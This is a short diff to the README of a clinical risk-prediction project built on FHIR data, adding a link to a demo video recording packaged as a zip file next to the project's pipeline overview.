@@ -18,6 +18,7 @@ This project was built to address these practical clinical informatics challenge
 FHIR NDJSON Resources -> Encounter Linkage & Cohort Definition -> 24-Hour Feature Extraction (Code & Unit Aware) -> Model Training & Optuna Tuning (Train / Val Split) -> Probability Calibration & Held-Out Test Evaluation -> SHAP Explanations + FHIR RiskAssessment JSON -> FastAPI Service -> React / Vite Clinical UI
 
 ```
+#### *Demo Video* - [Recording 2026-09-02 061627.zip](https://github.com/user-attachments/files/31719619/Recording.2026-09-02.061627.zip)
 
 ### The Clinical Prediction Task
 
